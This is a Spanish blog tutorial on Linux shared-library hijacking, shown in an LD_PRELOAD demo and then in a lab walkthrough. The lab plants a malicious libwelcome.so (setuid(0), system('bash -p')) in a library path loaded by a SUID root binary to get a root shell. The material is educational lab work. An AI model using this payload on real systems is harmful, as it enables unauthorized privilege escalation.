---
layout: single
title: Escalada de privilegio
date: 2025-02-25
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - Seguridad en sistemas operativos
  - Vulnerabilidades y Explotación
tags:
  - escalada de privilegio
  - privilegio
  - linux
  - windows
  - suid
  - vulnerabilidades
  - explotación
  - ciberseguridad
  - root
  - hackingetico
---
Ataque a nivel de software que involucra bibliotecas compartidas y el sistema de enlace dinámico.

---

## Biblioteca de objetos compartidos (shared object libraries)
Es sistemas como Linux y otros basados en Unix, las bibliotecas compartidas son archivos que contienen código que pueden ser utilizado por diferentes programas al mismo tiempo, en lugar de que cada programa tenga que incluiruna copia local del mismo código. Estas bibliotecas suelen tener una extensión como `.so` (shared object).

## Enlaces dinámicos (Dynamic Linking)
El enlace dinámico ocurre cuando un programa se enlaza con biblotecas externas durante su ejecución, no en tiempo de compilación. El sistema operativo carga la bibliotecas necesarias en memoria cuando el programa se ejecuta.

## Secuestro de bibliotecas (Librery Hijacking)
Un secuestro de biblioteca se refiere a un ataque donde un atacante reemplaza o inyecta una versión manipulada de una biblioteca compartida que un programa intenta cargar durante su ejecución. Si el sistema no verifica correctamente la fuente de la biblioteca, el atacante puede tomar el control del comportamiento del programa. Esto escomún en ciertos tipos de vulnerabilidades, como el `DLL Hijacking` en sistemas windows o en otros sistemas conmecanimos similares.

## Secuentro de bibliotecas compartidas enlazadas dinámicamente
Este tipo de secuestro ocurre cuando un atacante logra engañar el programa para que cargue una biblioteca manipulada en ligar que de la legítima. Esto podría permitir que el atacante ejecute código malicioso con los privilegios del programa que se va compartiendo.

---

## Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente en entorno contolado

Script `random.c` en `c` que nos muestra por consola un número aleatorio:
```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]) {
    srand(time(NULL));
    printf("%d\n", rand());
}
```
Lo compilamos con:
```bash
gcc random.c -o random
``` 
*Se ejecuta `./random`*

Salida 
```bash
./random
1668218290
```
*Cada vez que lo ejecutemos, nos va a dar valores diferentes*
Si quisíeramos visualizar las librerías que está empleando para que esto esté funcionando correctamente, todo lo que se está empleando por detrás, podriamos ejecutar el comando `ldd` pero no vamos a ver cosas descriptivas, en este caso vamos a estar implementando una herramienta `uftrace` detrazado (tracing) de rendiento y depuración para programas en sistemas Linux.

```bash
git clone https://github.com/namhyung/uftrace
cd uftrace
sudo misc/install-deps.sh
./configure
make
make install
uftrace --help
```

```bash
uftrace --force -a random
```

**Salida** 
```bash
❯ uftrace --force -a random
422586994
# DURATION     TID      FUNCTION
   8.825 us [1360693] | time();
   2.386 us [1360693] | srand();
   0.751 us [1360693] | rand();
 170.488 us [1360693] | printf("%d\n") = 10;
```
*Ahora visualizamos el script mas descriptivo con esta herramienta*
Vamos a tratar de secuestrar la librería `rand()` para que el valor que nos retorne continuamente a la hora ejecutar él `random` sea siempre un número fijo por ejemplo el "42", normalmente en este caso a la hora de ejecutar el programa emplee nuestro `rand()` falso, el `rand()` normal debe de coincidir a nivel de firma. La firma de una función normalmente contempla lo siguente: `Nombre -> Argumento -> Tipo de retorno`, lo que podemos hacer es:
```bash
man 3 rand
```
*Este "3" hace alusión a la sección del manual que queremos consultar que en este caso se refire a las funciones de la biblioteca `c`*
**Salida**
*Lo que tendríamos que configurar sería una estructura como está para secuestrar la librería*
```
tipo de retorno   nombre     argumento
int                rand       (void);
```

**Creamos un archivo `test.c`**:
```c
int rand(void) {
    return 42;
}
```
El punto es que cuando ejecutamos el programa `random` el enlazador dinámico lo que hace por detrás es cargar las bibliotecas compartidas necesaria para que todo este programa funcione correctamente, el enlazador dinámico funciona de una forma peculiar toma como prioridad aquello que lea de una variable de entorno con nombre `LD_PRELOAD` si esta variable de entorno la igualo a un binario correspondiente a una variable compartida que previamente me haya compilado

**Creamos una biblioteca compartida**:
```bash
gcc -shared -fPIC test.c -o test
```

**Cargamos primeramente mi funcion `rand()`**
```bash
LD_PRELOAD=./test ./random
```

**Salida**
```bash
42
```
*Con esto secuestramos las biblioteca y ente punto, como atacante uno, ya puede imaginar las cosas que se pueden llegar a hacer*. Esto lo vamos hacer en un labortorio práctico que esta en (attack defense)[https://attackdefense.com/] nos tenemos que registrar con `Google` y filtramos por `Librery Chaos` para poder poder practicar cómo escalar privilegios aprovechando el abuso de secuestro de la biblioteca compartida enlazada dinámicamente

todo esto lo vamos hacer en la web, le damos `run` a `Librery Chaos` *esto puede tardar un poco* nos abre una instancia personalizada; hay que tratar de abusar de un binario que se encuentra en `/usr/bin/welcome` si nos fijamos con `ls -l` vemos que `SUID` y el propietario es `root` si lo ejecutamos:
```bash
welcome
```
**Salida**
```bash
welcome: error whiile loading shared libreries: libwelcome.so: cannot open shared object file: No such file or directory
```
*Esto nos está diciendo que no ha podido abrir la librería compartida `libwelcome.so` no la está encontrando*

**Ejecutamos el comando**:
```bash
ldd /usr/bin/welcome
```
**Salida**
```bash
linux-vdso.so.1 (0x00007ffe857dc000)
libwelcome.so => not found
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f675e329000)
/lib64/ld-linux-x86-64.so.2 (0x00007f675e91c000)
```
*Nos muestra que `libwelcome.so => not found`*
Aca, si hacemos con `LD_PRELOAD` y tratamos de cargar nuestro recurso de forma forzada, no nos va a dejar. Hay ocasiones cuando no nos deja, hay otra vía para ver si tenemos capacidad de escritura en está ruta:
```bash
ls -l /etc/ | grep "ld.so.conf.d"
```
**Salida
```
drwxr-xr-x 1 root root 4096 Sep 26 2025 ld.so.conf.d
```
*El propietario es `root` pero otros no pueden escribir* no tengo capacidad de escritura en esta ruta.
Si tuviera capacidad de escritura en el directorio `ld.so.conf.d` podría haber creado un archivo de configuración a través del cual indicar a qué ruta tiene que ir para encontrar el `libwelcome.so`

En la ruta `/etc/ld.so.conf.d` se encuentra un archivo `custom` y esta involucrando la ruta `/home/student/lib`entramos y el direcotorio `lib` no exite. Lo creamos `mkdir lib` y dentro del directorio `lib` creamos un archivo `vi test.c`:
```c
#include <stdio.h>
#include <unistd.h>

int welcome() {
    setuid(0);
    setgid(0);
    system("bash -p");
    return 0;
}
```
**Creamos una biblioteca compartida**
```bash
gcc -fPIC -shared test.c -o libwelcome.so
```
*Nos aparece un `WARNING` pero nos crea de todos modos*

**Ahora si este `libwelcome.so` lo meto en el directorio `lib`
```bash
mv libwelcome.so lib
```

**Hacemos un**:
```bash
ldd /usr/bin/welcome
```

**Salida**
```bash
linux-vdso.so.1 (0x00007ffe857dc000)
libwelcome.so => /home/student/lib/libwelcome.so (0x00007fd33149d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f675e329000)
/lib64/ld-linux-x86-64.so.2 (0x00007f675e91c000)
```
*Ahora secuestramos*

Ejecutamos el `welcome` ahora somos `root`
```bash
whoami
```

[!NOTA] No se puede secuestrar funciones de bibliotecas compartidas que estén enlazadas estáticamente, porque las funciones, en este caso de la biblioteca, están incrustadas en el ejecutable mismo, no las busca en otro lugar

---


### Herramientas

(uftrace)[https://github.com/namhyung/uftrace]
